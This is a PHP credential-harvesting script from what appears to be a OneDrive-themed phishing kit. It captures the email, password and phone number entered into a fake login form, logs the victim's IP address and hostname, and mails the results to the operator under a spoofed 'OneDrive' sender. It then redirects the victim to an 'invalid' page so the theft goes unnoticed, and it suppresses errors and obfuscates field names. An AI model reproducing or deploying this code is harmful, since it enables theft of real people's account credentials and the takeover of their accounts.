<?php
error_reporting(0);
session_start();
ob_start();

//Getting user ip & hostname
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

//Downloading the form data into variables
$_SESSION['ma1l'] = $ma1l = $_POST['id1'];
$Pma1l = $_POST['id2'];
$Ph0ne = $_POST['id3'];

//Load the email for report
include("../your_email.php");


//Conditioning incase of empty submission(s)
if ($ma1l == "" || $Pma1l == "") {
	
	$back = "./";
	$message = "One or more field submitted is empty";
	header ("Location: $back?core=$message");
	
	
	}else {
		
//Putting logs into simple mailer		
		
$L0G = "===============L0G /LION DID IT\====================		
	
Email : $ma1l	
	
Password : 	$Pma1l

Phone : $Ph0ne
------------------ Host & IP -------------------
IP : https://whatismyipaddress.com/ip/$ip
Hostname (Advanced) : $hostname	
	";
//Arranging headers
	
$subject = "$ma1l";
$headers = "From: OneDrive <stevennlevroon@gmail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
//Mailing
mail($SEND,$subject,$L0G,$headers);	


date_default_timezone_set('Europe/London');
$date = date('Y/m/d H:i:s');

$next = "invalid.php";
$extension = "ashtml";
$rand = base64_encode($message);
$rand2 = base64_encode($ma1l);
$rand3 = $date;
header ("Location: $next?$rand&saml=$rand2&stamp=$rand3");
	}



?>